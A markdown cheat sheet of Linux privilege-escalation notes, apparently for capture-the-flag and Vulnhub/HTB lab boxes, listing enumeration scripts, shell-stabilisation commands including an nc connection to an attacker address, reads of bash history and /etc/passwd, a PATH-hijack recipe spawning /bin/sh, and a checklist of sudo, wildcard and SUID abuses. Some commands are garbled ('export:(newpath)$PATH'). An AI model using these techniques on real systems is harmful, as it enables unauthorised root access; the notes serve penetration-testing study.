# *Nix Privilege Escalation
Once in the system, escalate to root/privilaged user.

**Scripts to help get a good view on the lay of the land**
Read the scripts and see which one fits the box. Automate local enum, look for any highlights, cron jobs, non standard scripts or programs, hard coded credentials, password reuse! against existing accounts

- [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) by: carlospolop
- [LinEnum.sh](https://github.com/rebootuser/LinEnum) By: Rebootuser 
- [Linuxprivchecker.py](www.securitysift.com/download/linuxprivchecker.py) By: Mike Chumak (Security Sift)
- [linexpchecker.py](https://github.com/inquisb/miscellaneous) By: Bernado Damele (inquisb)

**Curated binary files**
[GTFOBINS](https://gtfobins.github.io/)


**Stabilize Your Shell**
Make another shell
```scss
which nc
nc $ip $port

which python
python -c 'import pty; pty.spawn("bin/bash");

// In Kali
stty -a # Notice number of rows and columns
stty raw -echo && fg
// On target system
reset
stty rows xx
stty columns yy
export TERM=xterm-256color


```
**General Info/Enum**
```scss
//username, groups
id
hostname

// Part of too many groups? Find out all the files you've access to
for i in $(groups); do echo "=======$i======"; find / -group $i 2>/dev/null | grep -v "proc" >> allfiles; done

// Network
netstat -antp

// Don't overlook past cmd history
less .bash_history
less mysql_history

// check for user accounts
cat /etc/passwd | grep "sh$\|python"

// sudo privs?
sudo -l

```
**Abusing sudo**
Does the user have a command or file that can run sudo?
```
Remember to check Programs on GTFOBins
sudo -l 
```
Symbolic links, PATH and privilage escalation vulnerability
- referenses:
	- [Vulnhub: Hackme 1](Hackme 1: https://www.vulnhub.com/entry/hackme-1,330/)
	- [Hacking Articles: Using PATH Variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)

```scss
// Absolutepath not specified
	{
	echo "/bin/sh" > <program_name>
	chmod 777 <program_name>
	}

// Export PATH=.:$PATH (to a gobal writable folder]
	{
	check current path 
		export $PATH
	add path
		export:(newpath)$PATH
	}

sudo <program_name> or ./<program_name>

```



**Weak file permissions**
**Abusing CRON Jobs**

**Abusing wildcards**

- [ ] Password file /etc/passwd has write access
	- hacking articles: editing /etc/passwd file for privilage esclation
- [ ] TCMP dump
	- [Vulnhub: Web developer 1](https://www.vulnhub.com/entry/web-developer-1,288/)Fred Wemeijer 5Nov2018
- [ ] CHOWN | tar
	- hacking articles: exploiting wildcard for privilage esclation
- [ ] mounting the folder
	- [Vulnhub: pegasus](https://www.vulnhub.com/entry/pegasus-1,109/)Knapsy 16Dec2014
- [ ] group.xml file
	- hacking articles: penatration testing on group policy references
- [ ] SMB psexecution services
	- [HTB: active]
- [ ] "doas" functionality similiar to sudo functionality and "less"
	- [HTB: ypuffy]
	- [HTB: four and six 2]
- [ ] MySQL running as root
	- hacking articles: raven2 machine
- [ ] AWK
	- hacking articles: linux privilage esclation using exploiting sudo rights
- [ ] "rsh" is set with SUID bit | "pfexec" | wget in sudoers file
	- HTB: sunday
- [ ] /usr/bin/pip mentioned in sudoers file
	- hacking articles: wakanda
- [ ] /bin/screen 4.5.0
	- HTB: haircut
- [ ] curl
	- HTB: curling
- [ ] tmux is screen multiplier running as root
	- /bin/tmux

## Further References/Research
- [Fundamentals of Linux Privilage Esclation](https://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections) Elliot Cutright
Videos
- [Linux Privilage Esclation - Trade Craft Security Weekly #22](https://www.youtube.com/watch?v=oYHAi0cgur4) Security Weekly, Beau Bullock (@dafthack) - 14Dec2017
- [Privilage Esclation FTW](https://www.youtube.com/watch?v=yXe4X-AIbps) Jake Williams - 15Nov2018
- [ts Too Funky In Here04 Linux privilege escalation for fun profit and all around mischief Jake Willi](https://www.youtube.com/watch?v=kuE2yqULs-Y) Jake Williams - 10Sep2016 @MalwareJake
